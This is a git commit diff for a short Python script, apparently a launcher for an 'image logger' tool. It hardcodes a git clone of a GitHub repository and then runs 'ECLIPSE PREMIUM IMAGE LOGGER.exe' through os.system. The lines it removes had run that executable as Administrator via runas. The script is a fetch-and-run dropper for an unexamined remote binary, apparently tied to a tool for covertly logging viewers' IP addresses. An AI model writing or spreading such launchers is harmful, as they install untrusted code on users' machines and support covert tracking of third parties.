1e87d9fe4a9e998aaa7463a8c6f023a4c10f7a4d
PsxDupingg <130394609+PsxDupingg@users.noreply.github.com>
2023-06-25 17:23:23 +0200

    Update finally done.py

--- image logger/finally done.py
+++ image logger/finally done.py
@@ -1,5 +1,4 @@
 import os
-import subprocess
 
 def run_custom_command(command):
     os.system(command)
@@ -8,16 +7,16 @@ def open_folder(folder_path):
     os.startfile(folder_path)
 
 def execute_exe(file_path):
-    subprocess.run(["runas", "/user:Administrator", file_path])
+    os.system(file_path)
 
-# Benutzerdefinierten Befehl ausführen
-custom_command = input("git clone https://github.com/PsxDupingg/image-logger: ")
+# Benutzerdefinierter Befehl ausführen
+custom_command = "git clone https://github.com/PsxDupingg/image-logger"
 run_custom_command(custom_command)
 
 # Ordner öffnen
-folder_path = input("image-logger: ")
+folder_path = "image-logger"
 open_folder(folder_path)
 
-# .exe-Datei als Administrator ausführen
-exe_file_path = input("ECLIPSE PREMIUM IMAGE LOGGER.exe: ")
+# .exe-Datei ausführen
+exe_file_path = "ECLIPSE PREMIUM IMAGE LOGGER.exe"
 execute_exe(exe_file_path)
